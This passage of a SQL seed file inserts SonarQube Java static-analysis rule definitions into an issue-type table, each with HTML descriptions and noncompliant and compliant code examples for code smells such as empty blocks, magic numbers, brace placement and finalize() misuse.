    Collection&lt;User&gt; users = parse(userList);
    return users;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo {
  // Configuration is a class that returns customizable properties: it can be mocked to be injected during tests.
  private Configuration config;
  public Foo(Configuration myConfig) {
    this.config = myConfig;
  }
  public Collection&lt;User&gt; listUsers() {
    // Find here the way to get the correct folder, in this case using the Configuration object
    String listingFolder = config.getProperty("myApplication.listingFolder");
    // and use this parameter instead of the hard coded path
    File userList = new File(listingFolder, "users.txt"); // Compliant
    Collection&lt;User&gt; users = parse(userList);
    return users;
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/OjdGBQ">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S108', 'Nested blocks of code should not be left empty', 'sonarqube', 'Code Smell', '<p>Most of the time a block of code is empty when a piece of code is really missing. So such empty block must be either filled or removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (int i = 0; i &lt; 42; i++){}  // Empty on purpose or missing piece of code ?
</pre>
<h2>Exceptions</h2>
<p>When a block contains a comment, this block is not considered to be empty unless it is a <code>synchronized</code> block. <code>synchronized</code>
blocks are still considered empty even with comments because they can still affect program flow.</p>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S109', 'Magic numbers should not be used', 'sonarqube', 'Code Smell', '<p>A magic number is a number that comes out of nowhere, and is directly used in a statement. Magic numbers are often used, for instance to limit the
number of iterations of a loop, to test the value of a property, etc.</p>
<p>Using magic numbers may seem obvious and straightforward when you''re writing a piece of code, but they are much less obvious and straightforward at
debugging time.</p>
<p>That is why magic numbers must be demystified by first being assigned to clearly named variables before being used.</p>
<p>-1, 0 and 1 are not considered magic numbers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public static void doSomething() {
	for(int i = 0; i &lt; 4; i++){                 // Noncompliant, 4 is a magic number
		...
	}
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public static final int NUMBER_OF_CYCLES = 4;
public static void doSomething() {
  for(int i = 0; i &lt; NUMBER_OF_CYCLES ; i++){
    ...
  }
}
</pre>
<h2>Exceptions</h2>
<p>This rule ignores <code>hashCode</code> methods.</p>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S110', 'Inheritance tree of classes should not be too deep', 'sonarqube', 'Code Smell', '<p>Inheritance is certainly one of the most valuable concepts in object-oriented programming. It''s a way to compartmentalize and reuse code by
creating collections of attributes and behaviors called classes which can be based on previously created classes. But abusing this concept by creating
a deep inheritance tree can lead to very complex and unmaintainable source code. Most of the time too deep of an inheritance tree is due to bad object
oriented design which leads to a systematic use of ''inheritance'' when ''composition'' would be better suited.</p>
<p>This rule raises an issue when the inheritance tree, starting from <code>Object</code> has a greater depth than is allowed. </p>
<p>For the parameter of the rule, the following rules are applied:</p>
<ul>
  <li> <code>?</code> matches a single character </li>
  <li> <code>*</code> matches zero or more characters </li>
  <li> <code>**</code> matches zero or more packages </li>
</ul>
<p>Examples:</p>
<ul>
  <li> <code>java.fwk.AbstractFwkClass</code> will stop count when AbstractFwkClassclass is reached. </li>
  <li> <code>java.fwk.*</code> will stop count when any member of java.fwkPackage package is reached. </li>
  <li> <code>java.fwk.**</code> same as above, but including sub-packages. </li>
</ul>
<p>Exceptions:</p>
<p>The rule stops counting when it encounters a class from one of the following packages (or sub-packages):</p>
<ul>
  <li> <code>android.**</code> </li>
  <li> <code>com.intellij.**</code> </li>
  <li> <code>com.persistit.**</code> </li>
  <li> <code>javax.swing.**</code> </li>
  <li> <code>org.eclipse.**</code> </li>
  <li> <code>org.springframework.**</code> </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1104', 'Class variable fields should not have public accessibility', 'sonarqube', 'Code Smell', '<p>Public class variable fields do not respect the encapsulation principle and has three main disadvantages:</p>
<ul>
  <li> Additional behavior such as validation cannot be added. </li>
  <li> The internal representation is exposed, and cannot be changed afterwards. </li>
  <li> Member values are subject to change from anywhere in the code and may not meet the programmer''s assumptions. </li>
</ul>
<p>By using private attributes and accessor methods (set and get), unauthorized modifications are prevented.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {

  public static final int SOME_CONSTANT = 0;     // Compliant - constants are not checked

  public String firstName;                       // Noncompliant

}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass {

  public static final int SOME_CONSTANT = 0;     // Compliant - constants are not checked

  private String firstName;                      // Compliant

  public String getFirstName() {
    return firstName;
  }

  public void setFirstName(String firstName) {
    this.firstName = firstName;
  }

}
</pre>
<h2>Exceptions</h2>
<p>Because they are not modifiable, this rule ignores <code>public final</code> fields. Also, annotated fields, whatever the annotation(s) will be
ignored, as annotations are often used by injection frameworks, which in exchange require having public fields.</p>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/493.html">MITRE, CWE-493</a> - Critical Public Variable Without Final Modifier </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1105', 'An open curly brace should be located at the end of a line', 'sonarqube', 'Code Smell', '<p>Shared naming conventions allow teams to collaborate effectively. This rule raises an issue when an open curly brace is not placed at the end of a
line of code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if(condition)
{
  doSomething();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if(condition) {
  doSomething();
}
</pre>
<h2>Exceptions</h2>
<p>When blocks are inlined (left and right curly braces on the same line), no issue is triggered. </p>
<pre>
if(condition) {doSomething();}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1106', 'An open curly brace should be located at the beginning of a line', 'sonarqube', 'Code Smell', '<p>Shared coding conventions make it possible to collaborate efficiently. This rule makes it mandatory to place the open curly brace at the beginning
of a line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void myMethod {  // Noncompliant
  if(something) {  // Noncompliant
    executeTask();
  } else {  // Noncompliant
    doSomethingElse();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void myMethod
{
  if(something)
  {
    executeTask();
  } else
  {
    doSomethingElse();
  }
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1107', 'Close curly brace and the next "else", "catch" and "finally" keywords should be located on the same line', 'sonarqube', 'Code Smell', '<p>Shared coding conventions make it possible for a team to collaborate efficiently.</p>
<p>This rule makes it mandatory to place closing curly braces on the same line as the next <code>else</code>, <code>catch</code> or
<code>finally</code> keywords.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void myMethod() {
  if(something) {
    executeTask();
  } else if (somethingElse) {
    doSomethingElse();
  }
  else {                               // Noncompliant
     generateError();
  }

  try {
    generateOrder();
  } catch (Exception e) {
    log(e);
  }
  finally {                            // Noncompliant
    closeConnection();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void myMethod() {
  if(something) {
    executeTask();
  } else if (somethingElse) {
    doSomethingElse();
  } else {
     generateError();
  }

  try {
    generateOrder();
  } catch (Exception e) {
    log(e);
  } finally {
    closeConnection();
  }
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1108', 'Close curly brace and the next "else", "catch" and "finally" keywords should be on two different lines', 'sonarqube', 'Code Smell', '<p>Shared coding conventions make it possible for a team to collaborate efficiently.</p>
<p>This rule makes it mandatory to place a closing curly brace and the next <code>else</code>, <code>catch</code> or <code>finally</code> keyword on
two different lines.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void myMethod() {
  if(something) {
    executeTask();
  } else if (somethingElse) {          // Noncompliant
    doSomethingElse();
  }
  else {                               // Compliant
     generateError();
  }

  try {
    generateOrder();
  } catch (Exception e) {
    log(e);
  }
  finally {
    closeConnection();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void myMethod() {
  if(something) {
    executeTask();
  }
  else if (somethingElse) {
    doSomethingElse();
  }
  else {
     generateError();
  }

  try {
    generateOrder();
  }
  catch (Exception e) {
    log(e);
  }
  finally {
    closeConnection();
  }
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1109', 'A close curly brace should be located at the beginning of a line', 'sonarqube', 'Code Smell', '<p>Shared coding conventions make it possible for a team to efficiently collaborate. This rule makes it mandatory to place a close curly brace at the
beginning of a line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if(condition) {
  doSomething();}
</pre>
<h2>Compliant Solution</h2>
<pre>
if(condition) {
  doSomething();
}
</pre>
<h2>Exceptions</h2>
<p>When blocks are inlined (open and close curly braces on the same line), no issue is triggered. </p>
<pre>
if(condition) {doSomething();}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1110', 'Redundant pairs of parentheses should be removed', 'sonarqube', 'Code Smell', '<p>The use of parentheses, even those not required to enforce a desired order of operations, can clarify the intent behind a piece of code. But
redundant pairs of parentheses could be misleading, and should be removed. </p>
<h2>Noncompliant Code Example</h2>
<pre>
int x = (y / 2 + 1);   //Compliant even if the parenthesis are ignored by the compiler

if (a &amp;&amp; ((x+y &gt; 0))) {  // Noncompliant
  //...
}

return ((x + 1));  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
int x = (y / 2 + 1);

if (a &amp;&amp; (x+y &gt; 0)) {
  //...
}

return (x + 1);
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1111', 'The Object.finalize() method should not be called', 'sonarqube', 'Bug', '<p>According to the official javadoc documentation, this Object.finalize() is called by the garbage collector on an object when garbage collection
determines that there are no more references to the object. Calling this method explicitly breaks this contract and so is misleading. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public void dispose() throws Throwable {
  this.finalize();                       // Noncompliant
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/586.html">MITRE, CWE-586</a> - Explicit Call to Finalize() </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/4jZGBQ">CERT, MET12-J.</a> - Do not use finalizers </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1113', 'The Object.finalize() method should not be overridden', 'sonarqube', 'Code Smell', '<p>The <code>Object.finalize()</code> method is called on an object by the garbage collector when it determines that there are no more references to
the object. But there is absolutely no warranty that this method will be called AS SOON AS the last references to the object are removed. It can be
few microseconds to few minutes later. So when system resources need to be disposed by an object, it''s better to not rely on this asynchronous
mechanism to dispose them.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {
  ...
  protected void finalize() {
    releaseSomeResources();    // Noncompliant
  }
  ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/4jZGBQ">CERT, MET12-J.</a> - Do not use finalizers </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1114', '"super.finalize()" should be called at the end of "Object.finalize()" implementations', 'sonarqube', 'Bug', '<p>Overriding the <code>Object.finalize()</code> method must be done with caution to dispose some system resources.</p>
<p>Calling the <code>super.finalize()</code> at the end of this method implementation is highly recommended in case parent implementations must also
dispose some system resources.</p>
<h2>Noncompliant Code Example</h2>
<pre>
protected void finalize() {   // Noncompliant; no call to super.finalize();
  releaseSomeResources();
}

protected void finalize() {
  super.finalize();  // Noncompliant; this call should come last
  releaseSomeResources();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
protected void finalize() {
  releaseSomeResources();
  super.finalize();
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/568.html">MITRE, CWE-568</a> - finalize() Method Without super.finalize() </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/4jZGBQ">CERT, MET12-J.</a> - Do not use finalizers </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1116', 'Empty statements should be removed', 'sonarqube', 'Code Smell', '<p>Empty statements, i.e. <code>;</code>, are usually introduced by mistake, for example because:</p>
<ul>
  <li> It was meant to be replaced by an actual statement, but this was forgotten. </li>
  <li> There was a typo which lead the semicolon to be doubled, i.e. <code>;;</code>. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
void doSomething() {
  ;                                                       // Noncompliant - was used as a kind of TODO marker
}

void doSomethingElse() {
  System.out.println("Hello, world!");;                     // Noncompliant - double ;
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void doSomething() {}

void doSomethingElse() {
  System.out.println("Hello, world!");
  ...
  for (int i = 0; i &lt; 3; i++) ; // compliant if unique statement of a loop
  ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/5dUxBQ">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never executed
  </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/IDZGBQ">CERT, MSC51-J.</a> - Do not place a semicolon immediately following an if, for, or while
  condition </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/WtYxBQ">CERT, EXP15-C.</a> - Do not place a semicolon on the same line as an if, for, or while
  statement </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1117', 'Local variables should not shadow class fields', 'sonarqube', 'Code Smell', '<p>Overriding or shadowing a variable declared in an outer scope can strongly impact the readability, and therefore the maintainability, of a piece of
code. Further, it could lead maintainers to introduce bugs because they think they''re using one variable but are really using another.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Foo {
  public int myField;

  public void doSomething() {
    int myField = 0;
    ...
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/display/c/DCL01-C.+Do+not+reuse+variable+names+in+subscopes">CERT, DCL01-C.</a> - Do not reuse
  variable names in subscopes </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/display/java/DCL51-J.+Do+not+shadow+or+obscure+identifiers+in+subscopes">CERT, DCL51-J.</a> - Do
  not shadow or obscure identifiers in subscopes </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1118', 'Utility classes should not have public constructors', 'sonarqube', 'Code Smell', '<p>Utility classes, which are collections of <code>static</code> members, are not meant to be instantiated. Even abstract utility classes, which can
be extended, should not have public constructors.</p>
<p>Java adds an implicit public constructor to every class which does not define at least one explicitly. Hence, at least one non-public constructor
should be defined.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class StringUtils { // Noncompliant

  public static String concatenate(String s1, String s2) {
    return s1 + s2;
  }

}
</pre>
<h2>Compliant Solution</h2>
<pre>
class StringUtils { // Compliant

  private StringUtils() {
    throw new IllegalStateException("Utility class");
  }

  public static String concatenate(String s1, String s2) {
    return s1 + s2;
  }

}
</pre>
<h2>Exceptions</h2>
<p>When class contains <code>public static void main(String[] args)</code> method it is not considered as utility class and will be ignored by this
rule.</p>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1119', 'Labels should not be used', 'sonarqube', 'Code Smell', '<p>Labels are not commonly used in Java, and many developers do not understand how they work. Moreover, their usage makes the control flow harder to
follow, which reduces the code''s readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int matrix[][] = {
  {1, 2, 3},
  {4, 5, 6},
  {7, 8, 9}
};

outer: for (int row = 0; row &lt; matrix.length; row++) {   // Non-Compliant
  for (int col = 0; col &lt; matrix[row].length; col++) {
    if (col == row) {
      continue outer;
    }
    System.out.println(matrix[row][col]);                // Prints the elements under the diagonal, i.e. 4, 7 and 8
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (int row = 1; row &lt; matrix.length; row++) {          // Compliant
  for (int col = 0; col &lt; row; col++) {
    System.out.println(matrix[row][col]);                // Also prints 4, 7 and 8
  }
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S112', 'Generic exceptions should never be thrown', 'sonarqube', 'Code Smell', '<p>Using such generic exceptions as <code>Error</code>, <code>RuntimeException</code>, <code>Throwable</code>, and <code>Exception</code> prevents
calling methods from handling true, system-generated exceptions differently than application-generated errors. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public void foo(String bar) throws Throwable {  // Noncompliant
  throw new RuntimeException("My Message");     // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void foo(String bar) {
  throw new MyOwnRuntimeException("My Message");
}
</pre>
<h2>Exceptions</h2>
<p>Generic exceptions in the signatures of overriding methods are ignored, because overriding method has to follow signature of the throw declaration
in the superclass. The issue will be raised on superclass declaration of the method (or won''t be raised at all if superclass is not part of the
analysis).</p>
<pre>
@Override
public void myMethod() throws Exception {...}
</pre>
<p>Generic exceptions are also ignored in the signatures of methods that make calls to methods that throw generic exceptions.</p>
<pre>
public void myOtherMethod throws Exception {
  doTheThing();  // this method throws Exception
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/397.html">MITRE, CWE-397</a> - Declaration of Throws for Generic Exception </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/_DdGBQ">CERT, ERR07-J.</a> - Do not throw RuntimeException, Exception, or Throwable </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1120', 'Source code should be indented consistently', 'sonarqube', 'Code Smell', '<p>Proper indentation is a simple and effective way to improve the code''s readability. Consistent indentation among the developers within a team also
reduces the differences that are committed to source control systems, making code reviews easier. </p>
<p>This rule raises an issue when indentation does not match the configured value. Only the first line of a badly indented section is reported.</p>
<h2>Noncompliant Code Example</h2>
<p>With an indent size of 2:</p>
<pre>
class Foo {
  public int a;
   public int b;   // Noncompliant, expected to start at column 4

...

  public void doSomething() {
    if(something) {
          doSomethingElse();  // Noncompliant, expected to start at column 6
  }   // Noncompliant, expected to start at column 4
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Foo {
  public int a;
  public int b;

...

  public void doSomething() {
    if(something) {
        doSomethingElse();
    }
  }
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1121', 'Assignments should not be made from within sub-expressions', 'sonarqube', 'Code Smell', '<p>Assignments within sub-expressions are hard to spot and therefore make the code less readable. Ideally, sub-expressions should not have
side-effects.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ((str = cont.substring(pos1, pos2)).isEmpty()) {  // Noncompliant
  //...
</pre>
<h2>Compliant Solution</h2>
<pre>
str = cont.substring(pos1, pos2);
if (str.isEmpty()) {
  //...
</pre>
<h2>Exceptions</h2>
<p>Assignments in <code>while</code> statement conditions, and assignments enclosed in relational expressions are ignored.</p>
<pre>
BufferedReader br = new BufferedReader(/* ... */);
String line;
while ((line = br.readLine()) != null) {...}
</pre>
<p>Chained assignments, including compound assignments, are ignored.</p>
<pre>
int i = j = 0;
int k = (j += 1);
result = (bresult = new byte[len]);
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/481.html">MITRE, CWE-481</a> - Assigning instead of Comparing </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/ZNYxBQ">CERT, EXP45-C.</a> - Do not perform assignments in selection statements </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/ITZGBQ">CERT, EXP51-J.</a> - Do not perform assignments in conditional expressions </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1123', 'Deprecated elements should have both the annotation and the Javadoc tag', 'sonarqube', 'Code Smell', '<p>Deprecation should be marked with both the <code>@Deprecated</code> annotation and @deprecated Javadoc tag. The annotation enables tools such as
IDEs to warn about referencing deprecated elements, and the tag can be used to explain when it was deprecated, why, and how references should be
refactored. </p>
<p>Further, Java 9 adds two additional arguments to the annotation:</p>
<ul>
  <li> <code>since</code> allows you to describe when the deprecation took place </li>
  <li> <code>forRemoval</code>, indicates whether the deprecated element will be removed at some future date </li>
</ul>
<p>If your compile level is Java 9 or higher, you should be using one or both of these arguments.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyClass {

  @Deprecated
  public void foo1() {
  }

  /**
    * @deprecated
    */
  public void foo2() {    // Noncompliant
  }

}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {

  /**
    * @deprecated (when, why, refactoring advice...)
    */
  @Deprecated
  public void foo1() {
  }

  /**
    * Java &gt;= 9
    * @deprecated (when, why, refactoring advice...)
    */
  @Deprecated(since="5.1")
  public void foo2() {
  }

  /**
    * Java &gt;= 9
    * @deprecated (when, why, refactoring advice...)
    */
  @Deprecated(since="4.2", forRemoval=true)
  public void foo3() {
  }

}
</pre>
<h2>Exceptions</h2>
<p>The members and methods of a deprecated class or interface are ignored by this rule. The classes and interfaces themselves are still subject to
it.</p>
<pre>
/**
 * @deprecated (when, why, etc...)
 */
@Deprecated
class Qix  {

  public void foo() {} // Compliant; class is deprecated

}

/**
 * @deprecated (when, why, etc...)
 */
@Deprecated
interface Plop {

  void bar();

}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1124', 'Modifiers should be declared in the correct order', 'sonarqube', 'Code Smell', '<p>The Java Language Specification recommends listing modifiers in the following order:</p>
<ol>
  <li> Annotations </li>
  <li> public </li>
  <li> protected </li>
  <li> private </li>
  <li> abstract </li>
  <li> static </li>
  <li> final </li>
  <li> transient </li>
  <li> volatile </li>
  <li> synchronized </li>
  <li> native </li>
  <li> strictfp </li>
</ol>
<p>Not following this convention has no technical impact, but will reduce the code''s readability because most developers are used to the standard
order.</p>
<h2>Noncompliant Code Example</h2>
<pre>
static public void main(String[] args) {   // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public static void main(String[] args) {   // Compliant
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1125', 'Boolean literals should not be redundant', 'sonarqube', 'Code Smell', '<p>Redundant Boolean literals should be removed from expressions to improve readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (booleanMethod() == true) { /* ... */ }
if (booleanMethod() == false) { /* ... */ }
if (booleanMethod() || false) { /* ... */ }
doSomething(!false);
doSomething(booleanMethod() == true);

booleanVariable = booleanMethod() ? true : false;
booleanVariable = booleanMethod() ? true : exp;
booleanVariable = booleanMethod() ? false : exp;
booleanVariable = booleanMethod() ? exp : true;
booleanVariable = booleanMethod() ? exp : false;
</pre>
<h2>Compliant Solution</h2>
<pre>
if (booleanMethod()) { /* ... */ }
if (!booleanMethod()) { /* ... */ }
if (booleanMethod()) { /* ... */ }
doSomething(true);
doSomething(booleanMethod());

booleanVariable = booleanMethod();
booleanVariable = booleanMethod() || exp;
booleanVariable = !booleanMethod() &amp;&amp; exp;
booleanVariable = !booleanMethod() || exp;
booleanVariable = booleanMethod() &amp;&amp; exp;
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1126', 'Return of boolean expressions should not be wrapped into an "if-then-else" statement', 'sonarqube', 'Code Smell', '<p>Return of boolean literal statements wrapped into <code>if-then-else</code> ones should be simplified.</p>
<p>Similarly, method invocations wrapped into <code>if-then-else</code> differing only from boolean literals should be simplified into a single
invocation.</p>
<h2>Noncompliant Code Example</h2>
<pre>
boolean foo(Object param) {
  if (expression) { // Noncompliant
    bar(param, true, "qix");
  } else {
    bar(param, false, "qix");
  }

  if (expression) {  // Noncompliant
    return true;
  } else {
    return false;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
boolean foo(Object param) {
  bar(param, expression, "qix");

  return expression;
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1128', 'Unnecessary imports should be removed', 'sonarqube', 'Code Smell', '<p>The imports part of a file should be handled by the Integrated Development Environment (IDE), not manually by the developer. </p>
<p>Unused and useless imports should not occur if that is the case. </p>
<p>Leaving them in reduces the code''s readability, since their presence can be confusing.</p>
<h2>Noncompliant Code Example</h2>
<pre>
package my.company;

import java.lang.String;        // Noncompliant; java.lang classes are always implicitly imported
import my.company.SomeClass;    // Noncompliant; same-package files are always implicitly imported
import java.io.File;            // Noncompliant; File is not used

import my.company2.SomeType;
import my.company2.SomeType;    // Noncompliant; ''SomeType'' is already imported

class ExampleClass {

  public String someString;
  public SomeType something;

}
</pre>
<h2>Exceptions</h2>
<p>Imports for types mentioned in comments, such as Javadocs, are ignored.</p>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S113', 'Files should contain an empty newline at the end', 'sonarqube', 'Code Smell', '<p>Some tools work better when files end with an empty line.</p>
<p>This rule simply generates an issue if it is missing.</p>
<p>For example, a Git diff looks like this if the empty line is missing at the end of the file:</p>
<pre>
+class Test {
+}
 No newline at end of file
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1130', '"throws" declarations should not be superfluous', 'sonarqube', 'Code Smell', '<p>An exception in a <code>throws</code> declaration in Java is superfluous if it is:</p>
<ul>
  <li> listed multiple times </li>
  <li> a subclass of another listed exception </li>
  <li> completely unnecessary because the declared exception type cannot actually be thrown </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
void foo() throws MyException, MyException {}  // Noncompliant; should be listed once
void bar() throws Throwable, Exception {}  // Noncompliant; Exception is a subclass of Throwable
</pre>
<h2>Compliant Solution</h2>
<pre>
void foo() throws MyException {}
void bar() throws Throwable {}
</pre>
<h2>Exceptions</h2>
<p>The rule will not raise any issue for exceptions that cannot be thrown from the method body:</p>
<ul>
  <li> in overriding and implementation methods </li>
  <li> in interface <code>default</code> methods </li>
  <li> in non-private methods that only <code>throw</code>, have empty bodies, or a single return statement. </li>
  <li> in overridable methods (non-final, or not member of a final class, non-static, non-private), if the exception is documented with a proper
  JavaDoc </li>
</ul>
<p>Also, the rule won''t raise issues on <code>RuntimeException</code>, or one of its descendants, because explicating runtime exceptions which could
be thrown can ultimately help the method''s users, and can even be considered as good practice.</p>
<pre>
class A extends B {
  @Override
  void doSomething() throws IOException {
    compute(a);
  }

  public void foo() throws IOException {}

  public void qix() throws MyRuntimeException {}

  protected void bar() throws IOException {
    throw new UnsupportedOperationException("This method should be implemented in subclasses");
  }

  Object foobar(String s) throws IOException {
    return null;
  }

  /**
   * @throws IOException Overriding classes may throw this exception if they print values into a file
   */
  protected void print() throws IOException { // no issue, method is overridable and the exception has proper javadoc
    System.out.println("foo");
  }
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1132', 'Strings literals should be placed on the left side when checking for equality', 'sonarqube', 'Code Smell', '<p>It is preferable to place string literals on the left-hand side of an <code>equals()</code> or <code>equalsIgnoreCase()</code> method call.</p>
<p>This prevents null pointer exceptions from being raised, as a string literal can never be null by definition.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String myString = null;

System.out.println("Equal? " + myString.equals("foo"));                        // Noncompliant; will raise a NPE
System.out.println("Equal? " + (myString != null &amp;&amp; myString.equals("foo")));  // Noncompliant; null check could be removed
</pre>
<h2>Compliant Solution</h2>
<pre>
System.out.println("Equal?" + "foo".equals(myString));                         // properly deals with the null case
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1133', 'Deprecated code should be removed', 'sonarqube', 'Code Smell', '<p>This rule is meant to be used as a way to track code which is marked as being deprecated. Deprecated code should eventually be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Foo {
  /**
   * @deprecated
   */
